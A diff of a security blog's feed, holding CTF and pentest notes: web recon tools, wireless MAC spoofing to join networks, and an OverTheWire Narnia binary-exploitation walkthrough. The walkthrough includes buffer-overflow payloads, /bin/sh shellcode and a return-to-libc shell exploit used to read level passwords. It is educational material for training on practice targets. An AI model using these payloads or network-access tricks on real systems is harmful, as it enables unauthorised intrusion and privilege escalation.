+<li><strong>Eyewitness</strong> from Chris Truncer: <a href="https://github.com/ChrisTruncer/EyeWitness">EyeWitness</a>  is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible.</li>
 <li>Another method is to use <a href="https://code.google.com/p/java-html2image/">html2image</a> which is a simple Java library converts plain HTML markup to image and provides client-side image-map using HTML <map> element.</li>
 
+<br>
+<strong>Information gathering for http* services:</strong><br>
+<br>
+<li><strong>RAWR: Rapid Assesment of Web Resourses</strong>:<br> <a href="https://bitbucket.org/al14s/rawr/wiki/Home">RAWR</a> provides with a customizable CSV containing ordered information gathered for each host, with a field for making notes/etc.; An elegant, searchable, JQuery-driven HTML report that shows screenshots, diagrams, and other information. A report on relevent security headers. In short, it provides a landscape of your webapplications. It takes input from multiple formats such as Nmap, Nessus, OpenVAS etc.</li>
+<li> <a href="http://www.morningstarsecurity.com/research/whatweb"><strong>WhatWeb</strong></a> recognises web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded device.  <a href="https://www.aldeid.com/wiki/Tellmeweb">Tellmeweb</a> is a ruby script to read Nmap Gnmap file and run whatweb on all of them. A <a href="https://github.com/stevecoward/whatweb-parser">WhatWeb Result Parser</a>  also has been written  which converts the results to CSV format. More information about advance usage can be found <a href="https://github.com/urbanadventurer/WhatWeb/wiki/Advanced-Usage">here</a>.</li>
+<li><a href="http://wappalyzer.com"><strong>Wapplyzer</strong></a> is a Firefox plug-in. It works only on regular expression matching and doesn't need anything other than the page to be loaded on browser. It works completely at the browser level and gives results in the form of icons.</li>
+<li><a href="http://w3techs.com/"><strong>W3Tech</strong></a> is another Chrome plug-in which provides information about the usage of various types of technologies on the web. It tells the web technologies based on the crawling it has done. So example.com, x1.example.com, x2.example.com will show the same technologies as the domain is same (which is not correct).</li>
+<li><a href="https://github.com/justjavac/ChromeSnifferPlus"><strong>ChromeSnifferPlus</strong></a> is another chrome extension to sniff about the different web-technologies used by the website.</li>
+<li><a href="http://builtwith.com/"><strong>BuiltWith</strong></a> is another website which provides a good amount of information about the different technologies used by website.</li>
 </ul>
 </li>
 <li><strong>NetBIOS Service:</strong> 
 <br>
 Netbios listens on TCP Port 139, 445 and UDP Port 137.
 <br><br>
-How do we machines on which these three ports or a combination are open and feed that IP information to nbtscan and enum4linum.
+How do we machines on which these three ports or a combination are open and feed that IP information to nbtscan and enum4linux.
 We can do this by using grep such as
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -660,7 +774,7 @@ Script In Progress
   <entry>
     <title type="html"><![CDATA[Learning From Field : Wireless Pentesting]]></title>
     <link href="http://bitvijays.github.io/blog/2015/03/11/learning-from-field-wireless-pentesting/"/>
-    <updated>2015-03-11T09:58:34+00:00</updated>
+    <updated>2015-03-11T15:28:34+05:30</updated>
     <id>http://bitvijays.github.io/blog/2015/03/11/learning-from-field-wireless-pentesting</id>
     <content type="html"><![CDATA[<p>Recently, We got a chance to do some penetration testing. This post would cover the basics and approach.</p>
 
@@ -697,13 +811,38 @@ Script In Progress
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
+<span class='line-number'>6</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>airodump &lt;monitor interface&gt;
 </span><span class='line'>-N, --essid                 : Filter APs by ESSID.                                  ##Name of the Access Point
 </span><span class='line'>-d &lt;bssid&gt;, --bssid &lt;bssid&gt; : It will only show networks, matching the given bssid. ##MAC Address of Access Point
 </span><span class='line'>-a                          : It will only show associated clients.
-</span><span class='line'> -t &lt;OPN|WEP|WPA|WPA1|WPA2&gt;, --encrypt &lt;OPN|WEP|WPA|WPA1|WPA2&gt; : It will only show networks matching the given encryption.
-</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>-t &lt;OPN|WEP|WPA|WPA1|WPA2&gt;, --encrypt &lt;OPN|WEP|WPA|WPA1|WPA2&gt; : It will only show networks matching the given encryption.
+</span><span class='line'>-R, --essid-regex              Filter APs by ESSID using a regular expression</span></code></pre></td></tr></table></div></figure>
 </li>   
+<li>OPEN
+If there is no MAC authentication, and dhcp enabled, your machine would connect automatically. If there is no MAC authentication but dhcp is not enabled, it is advisable to sniff the network using wireshark and find the appropiate network range and the default gateway and set them manually. If there is MAC authentication and DHCP not enabled, you need to find valid associated clients. The catch is the valid associated clients will have an IP address whereas invalid associated clients will not have the IP address.
+<br>
+Find the associated clients connected to the particular access point by using the csv file produced by airodump. In the below example the access point is "24:DE:C6:C7:92:C2".
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat PL-01.csv | grep 24:DE:C6:C7:92:C2 | cut -d , -f 1,6 | grep -v OPN</span></code></pre></td></tr></table></div></figure>
+You may change your ip address of wireless adapter using
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig wlan4 hw ether 30:5A:3A:B4:09:BC
+</span><span class='line'>or 
+</span><span class='line'>macchanger
+</span><span class='line'>  -m,  --mac=XX:XX:XX:XX:XX:XX
+</span><span class='line'>       --mac XX:XX:XX:XX:XX:XX  Set the MAC XX:XX:XX:XX:XX:XX</span></code></pre></td></tr></table></div></figure>
+Once associated, we still need to find the valid IP address and valid MAC address, sniff the network, find the network ranges, gateway. Do a nmap Ping Scan to the local subnet which will provide IP address and MAC address. Cross-verify with the associated clients. Valid associated clients will have an IP address and MAC address entry in the airodump listing.
+Set the IP address using
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ifconfig wlan4 10.10.3.71 netmask 255.255.240.0</span></code></pre></td></tr></table></div></figure>
+Set the association using
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>iwconfig wlan4 essid "ESSID_NAME" ap "24:DE:C6:C7:92:C2(SSID_MAC_Address)"</span></code></pre></td></tr></table></div></figure></li>
 </ol>
 
 
@@ -730,7 +869,7 @@ SKA: Shared Key Authentication</p>
   <entry>
     <title type="html"><![CDATA[Learning From CTF : Reverse Engineering]]></title>
     <link href="http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering/"/>
-    <updated>2015-01-02T03:15:59+00:00</updated>
+    <updated>2015-01-02T08:45:59+05:30</updated>
     <id>http://bitvijays.github.io/blog/2015/01/02/learning-from-ctf-reverse-engineering</id>
     <content type="html"><![CDATA[<p>This post lists the learnings from the CTF while doing Reverse Engineering.</p>
 
@@ -749,7 +888,7 @@ file: The first step is to run file command on the binary which would tell us wh
 </span><span class='line'>cfy: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x9bc623f046535fba50a2124909fb871e5daf198e, not stripped</span></code></pre></td></tr></table></div></figure>
 </li>
 <li>
-The second step could be running strings or &#8220;hexdump -C&#8221; on it, specially in the case of very simple re challenges like asking for password and stored in an array.
+The second step could be running strings or "hexdump -C" on it, specially in the case of very simple re challenges like asking for password and stored in an array.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -791,7 +930,11 @@ strace: trace system calls and signals
 ltrace: A library call tracer
 </li>
 
-
+<li>GDB Commands:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>info file: Tell us about the entry points:
+</span><span class='line'>info functions: Tell us about the functions in the binary.</span></code></pre></td></tr></table></div></figure></li>
 </ol>
 
 
@@ -816,7 +959,7 @@ We need to read
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>leviathan2@melinda:~$ ls -l /etc/leviathan_pass/leviathan3 
 </span><span class='line'>-r-------- 1 leviathan3 leviathan3 11 Nov 14 10:32 /etc/leviathan_pass/leviathan3</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s see the ltrace of the binary while accessing a file which we are allowed to read
+Let's see the ltrace of the binary while accessing a file which we are allowed to read
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -835,7 +978,7 @@ Let&#8217;s see the ltrace of the binary while accessing a file which we are all
 </span><span class='line'>--- SIGCHLD (Child exited) ---
 </span><span class='line'>&lt;... system resumed&gt; )                                                                                                 = 0
 </span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>
-Let see what happen when we try to access file which we don&#8217;t have permission to.
+Let see what happen when we try to access file which we don't have permission to.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -848,7 +991,7 @@ Let see what happen when we try to access file which we don&#8217;t have permiss
 </span><span class='line'>puts("You cant have that file..."You cant have that file...
 </span><span class='line'>)                                                                                     = 27
 </span><span class='line'>+++ exited (status 1) +++</span></code></pre></td></tr></table></div></figure>
-So it&#8217;s a matter of tricking access(), if the call to access() succeeds then it calls system(&#8220;cat file&#8221;), so if pass the argument printfile /etc/issue, then it works.
+So it's a matter of tricking access(), if the call to access() succeeds then it calls system("cat file"), so if pass the argument printfile /etc/issue, then it works.
 We can get around it by using a space in our file name. Eg: touch foo\ bar. then we create a symlink to the password file and call it foo. ln -s /etc/leviathanpass/leviathan3 foo
 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -875,9 +1018,9 @@ We can get around it by using a space in our file name. Eg: touch foo\ bar. then
   
   <entry>
     <title type="html"><![CDATA[Learning From CTF : Binary Exploitation]]></title>
-    <link href="http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation/"/>
-    <updated>2014-11-09T20:42:01+00:00</updated>
-    <id>http://bitvijays.github.io/blog/2014/11/09/learning-from-ctf-binary-exploitation</id>
+    <link href="http://bitvijays.github.io/blog/2014/11/10/learning-from-ctf-binary-exploitation/"/>
+    <updated>2014-11-10T02:12:01+05:30</updated>
+    <id>http://bitvijays.github.io/blog/2014/11/10/learning-from-ctf-binary-exploitation</id>
     <content type="html"><![CDATA[<p>This post (Work in Progress) lists the tips and tricks while doing Binary Exploitation challenges during various CTF&rsquo;s and Over The Wire Wargame.</p>
 
 <!-- more -->
@@ -886,7 +1029,7 @@ We can get around it by using a space in our file name. Eg: touch foo\ bar. then
 <h3>Thanks to superkojiman, barrebas, et0x who helped me learning the concepts.</h3>
 
 <ol>
-Let&#8217;s start with some basic concepts and then we would see some examples which would help to clear the concepts.
+Let's start with some basic concepts and then we would see some examples which would help to clear the concepts.
 
 <li>
 Big-endian systems store the most significant byte of a word in the smallest address and the least significant byte is stored in the largest address. Little-endian systems, in contrast, store the least significant byte in the smallest address.
@@ -920,7 +1063,7 @@ Big-endian systems store the most significant byte of a word in the smallest add
 </span><span class='line'>Stack Protector                        : Compiler</span></code></pre></td></tr></table></div></figure> 
 <ul>
 <li> Which buffer overflow prevention techniques are used can be found by running <a href="http://www.trapkit.de/tools/checksec.html">Checksec Script</a>. This script is present in <a href="https://github.com/longld/peda">gdb-peda</a>.</li>
-<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it&#8217;s executable.
+<li>Whether the stack of binary is executable is not can be found by readelf tool. If Program header GNU_STACK has RWE flag, if it has E flag, it's executable.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:~$ readelf -l /narnia/narnia8 | grep GNU_STACK
@@ -987,16 +1130,16 @@ If necessary, you can disable ASLR for a specific program and its child processe
 <li>However, if the stack is not executable or the shellcode is not working (happens sometimes), then we can either,
 <ul>
 <li>export a environment variable with shellcode, find the address of env variable in the stack and then set the return address to starting of the shellcode and get a shell</li>
-<li>use return2libc which is a type of ROP: find the address of system function, find the address of &#8220;/bin/sh&#8221; in the stack and execute it like system(&#8220;/bin/sh&#8221;). It is in the format of 
+<li>use return2libc which is a type of ROP: find the address of system function, find the address of "/bin/sh" in the stack and execute it like system("/bin/sh"). It is in the format of 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;ADDRofSYSTEM&gt; &lt;4ArbitraryBytes for Return Address&gt; &lt;argument for system[/bin/sh]&gt;</span></code></pre></td></tr></table></div></figure>
-4Arbitrary Bytes for Return address could be a JUNK address or &#8220;\xCC\xCC\xCC\xCC&#8221; or address of exit function. 
+4Arbitrary Bytes for Return address could be a JUNK address or "\xCC\xCC\xCC\xCC" or address of exit function. 
 <ul>
-<li>If set to \xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you&#8217;re actually jumping to your shellcode, but once you&#8217;ve verified that it works, then you should remove it.</li> 
+<li>If set to \xCC\xCC\xCC\xCC so after system executes, it tries to return to 0xcccccccc. \xcc is good just to check if you're actually jumping to your shellcode, but once you've verified that it works, then you should remove it.</li> 
 <li>If a JUNK address is put, the binary will have already executed the shellcode but it will segfault. 
 <li>If the proper address of exit() is used, binary will exit cleanly.</li>
 </ul>
-It&#8217;s better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you&#8217;ll find that you haven&#8217;t elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env  variable like DASH=/bin/sh and reference that.
+It's better to use /bin/sh instead of /bin/bash since bash drops privs. If /bin/bash is used, it will launch /bin/bash but you'll find that you haven't elevated your privileges and this can get confusing. so either find another string that points to /bin/sh or set your own env  variable like DASH=/bin/sh and reference that.
 
 Good paper to review is <a href="http://www.exploit-db.com/papers/13204/">Bypassing non-executable-stack during Exploitation (return-to-libc)</a>.
  </li>
@@ -1010,7 +1153,7 @@ Good paper to review is <a href="http://www.exploit-db.com/papers/13204/">Bypass
 </ul></li>
 <li>Sometimes we need a shellcode to write a string or for getting a actual shell. A good reference can be found @<a href="http://www.exploit-db.com/papers/13224/">Introduction to Writing Shellcode</a>. Information about various system call integar value need to be present in EAX register is here <a href="http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html">Linux System Call Table</a>.
 
-Let&#8217;s see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.
+Let's see a small example where we move an address to eax register and jump to it. Address which we are moving to eax would contain our shellcode.
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1025,7 +1168,7 @@ Let&#8217;s see a small example where we move an address to eax register and jum
 </span><span class='line'>  jmp eax</span></code></pre></td></tr></table></div></figure>
 Just good to know: global directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark _start symbol global so its name is added in the object code (a.o). The linker (ld) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as _start in the code.
 
-If a global directive missing for a symbol that symbol will not be placed in the object code&#8217;s export table so linker has no way of knowing about the symbol.
+If a global directive missing for a symbol that symbol will not be placed in the object code's export table so linker has no way of knowing about the symbol.
 <br><br>
 We can compile the asm file by 
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
@@ -1067,7 +1210,7 @@ To see the byte code
 <li>What we mostly do when exploiting a buffer overflow (when placing the shellcode on stack) is we place our shellcode before EIP, we should also check if we can put our shellcode after EIP. This is particularly useful when some kind of check for shellcode is present in address before EIP. Example: Suppose our EIP is present at offset 80. We would usually do
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "\x90"*50 + "30 Bytes of ShellCode" + "4 Bytes return address to NOP or shellcode in left"'</span></code></pre></td></tr></table></div></figure>
-However, if somekind of check for alphanumeric characters is present for first 80 bytes you won&#8217;t be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example
+However, if somekind of check for alphanumeric characters is present for first 80 bytes you won't be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>python -c 'print "A"*80 + "4 Bytes return address to NOP or shellcode in right" + "\x90"*50 + "30 Bytes of ShellCode"'</span></code></pre></td></tr></table></div></figure>
 </li>
@@ -1288,7 +1431,7 @@ Quick diagram what it looks like:
 
 <ol>
 <li>
-Let&#8217;s see a simple example of binary exploitation <strong>Narnia0</strong> where we have to write a written value.
+Let's see a simple example of binary exploitation <strong>Narnia0</strong> where we have to write a written value.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1336,7 +1479,7 @@ Let&#8217;s see a simple example of binary exploitation <strong>Narnia0</strong>
 </span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
-In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 &#8220;A&#8221; and the address it won&#8217;t work as the val doesn&#8217;t matches. So, we have to use python print command.
+In this example, value of variable val can be overwritten by overflowing buf. Another small observation is scanf function scans 24 characters. If you directly write 20 "A" and the address it won't work as the val doesn't matches. So, we have to use python print command.
 If we use 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s">&#39;print &quot;A&quot;*20 + &quot;</span><span class="se">\xef\xbe\xad\xde</span><span class="s">&quot;&#39;</span> <span class="o">|</span> <span class="o">./</span><span class="n">narnia0</span>
@@ -1395,7 +1538,7 @@ if I write
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\xCC&quot;&#39;`</span>
 </span></code></pre></td></tr></table></div></figure>
-It should sigtrap. &#8220;\xCC&#8221; acts as a software breakpoint, basically an INT3,  It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you&#8217;re good to go, and it&#8217;s a good way to make sure you&#8217;ve properly redirected execution to your shellcode. You can further put &#8220;\xCC&#8221; anywhere in the shellcode, if it crashes before &#8220;\xCC&#8221;, you know for sure that your shellcode has bad characters.
+It should sigtrap. "\xCC" acts as a software breakpoint, basically an INT3,  It tells you whether your shellcode is stored properly & executed, if the program receives SIGTRAP, you know you're good to go, and it's a good way to make sure you've properly redirected execution to your shellcode. You can further put "\xCC" anywhere in the shellcode, if it crashes before "\xCC", you know for sure that your shellcode has bad characters.
 They suggested to export the EGG variable as
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="n">export</span> <span class="n">EGG</span><span class="o">=</span><span class="sb">`python -c &#39;print &quot;\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80&quot;&#39;`</span>
@@ -1438,7 +1581,7 @@ In another example <strong>Narnia2</strong>
 </span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
-It&#8217;s to easy that buffer overflow vulnerability exists because of strcpy. Let&#8217;s see what is the offset for this.
+It's to easy that buffer overflow vulnerability exists because of strcpy. Let's see what is the offset for this.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1489,7 +1632,7 @@ It&#8217;s to easy that buffer overflow vulnerability exists because of strcpy. 
 </span><span class='line'>Breakpoint 1, 0x080484a3 in main ()
 </span><span class='line'>(gdb) n
 </span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s see the stack after the strcpy, which would tell us the probable address we want to redirect execution.
+Let's see the stack after the strcpy, which would tell us the probable address we want to redirect execution.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1638,7 +1781,7 @@ Superkojiman notes explain this best, copied here with permission, thanks superk
 </span><span class='line'>copied contents of /etc/motd to a safer place... (/dev/null)</span></code></pre></td></tr></table></div></figure>
 We can use this program to read the contents of /etc/narnia_pass/narnia4, but the output is written to /dev/null. 
 
-We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here&#8217;s what the stack looks like:
+We control the input file and the output file is set as /dev/null. However, because of the way the stack is laid out, we can write past the ifile buffer and overwrite the value of ofile. This lets us replace /dev/null with another file of our choosing. Here's what the stack looks like:
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1782,7 +1925,7 @@ ifile and ofile are 32-byte arrays. We can compile the program with -ggdb and ex
 </li>
 
 <li>
-Let&#8217;s see another example  <strong>Narnia6</strong>.
+Let's see another example  <strong>Narnia6</strong>.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1877,10 +2020,10 @@ Stack is not executable for this binary. This binary is an example of “return-
 </span><span class='line'>PIE       : disabled
 </span><span class='line'>RELRO     : disabled
 </span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>
-Let&#8217;s compile the source on the local and check what happens:
+Let's compile the source on the local and check what happens:
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 -ggdb -fno-stack-protector -Wall narnia6.c -o narnia61</span></code></pre></td></tr></table></div></figure>
-If you see carefully, we passed A*8 + BBBB + &#8221; &#8221; + &#8220;C&#8221;*8 + DDDD, which resulted in
+If you see carefully, we passed A*8 + BBBB + " " + "C"*8 + DDDD, which resulted in
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -1979,14 +2122,14 @@ If you see carefully, we passed A*8 + BBBB + &#8221; &#8221; + &#8220;C&#8221;*8
 </span><span class='line'>$7 = (int (**)(char *)) 0xffffd388
 </span><span class='line'>gdb-peda$ p $fp
 </span><span class='line'>$8 = (void *) 0xffffd398</span></code></pre></td></tr></table></div></figure>
-The address of fp &#8220;p &fp&#8221; is 0xffffd3888 which has a value of (&#8220;p fp&#8221;) 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of (&#8220;p system&#8221;) 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.
+The address of fp "p &fp" is 0xffffd3888 which has a value of ("p fp") 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of ("p system") 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8 + "\x40\x1c\xe6\xf7" + " " + "C"*8 + "/bin/sh"'`
 </span><span class='line'>$ cat /etc/narnia_pass/narnia7</span></code></pre></td></tr></table></div></figure>
 </li>
 
-<li>Let&#8217;s see another example where we have to use a environment variable to invoke a shell <strong>Narnia8</strong>.
+<li>Let's see another example where we have to use a environment variable to invoke a shell <strong>Narnia8</strong>.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2049,10 +2192,10 @@ The address of fp &#8220;p &fp&#8221; is 0xffffd3888 which has a value of (&#822
 </span><span class='line'><span class="p">}</span>
 </span></code></pre></td></tr></table></div></figure>
 
-Let&#8217;s see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let&#8217;s see how the stack would look like
+Let's see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let's see how the stack would look like
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>&lt;bok character array&gt;&lt;blah pointer&gt;&lt;fp&gt;&lt;ret&gt;&lt;pointer b&gt;</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s confirm this by using gdb? We put an breakpoint on printf function in the func function.
+Let's confirm this by using gdb? We put an breakpoint on printf function in the func function.
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2063,13 +2206,13 @@ Let&#8217;s confirm this by using gdb? We put an breakpoint on printf function i
 </span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x00414141  0xffffd8b1
 </span><span class='line'>0xffffd6a0:   0x00000002  0xffffd764  0xffffd6c8  0x080484cd
 </span><span class='line'>0xffffd6b0:   0xffffd8b1  0xf7ffd000  0x080484fb  0xf7fca000</span></code></pre></td></tr></table></div></figure>
-Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it&#8217;s 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes <0x00000002 0xffffd764 0xffffd6c8>. Followed by 0x080484cd which is the return address
+Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it's 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes <0x00000002 0xffffd764 0xffffd6c8>. Followed by 0x080484cd which is the return address
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/s 0x080484cd
 </span><span class='line'>0x80484cd &lt;main+31&gt;:    "\353\025\213E\f\213"</span></code></pre></td></tr></table></div></figure>
 followed by pointer b (0xffffd8b1).
-Let&#8217;s see what&#8217;s at location 0xffffd8b1
+Let's see what's at location 0xffffd8b1
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2077,7 +2220,7 @@ Let&#8217;s see what&#8217;s at location 0xffffd8b1
 </span><span class='line'>0xffffd8b1:   0x41414141  0x41414141  0x41414141  0x41414141
 </span><span class='line'>0xffffd8c1:   0x00414141  0x5f474458  0x53534553  0x5f4e4f49</span></code></pre></td></tr></table></div></figure>
 
-Let&#8217;s see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))
+Let's see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
@@ -2095,7 +2238,7 @@ As expected, we get A followed by some garbage. which is the address where blah 
 We know that we can overwrite the RET address by 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'># `python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
-Let&#8217;s see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop
+Let's see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop
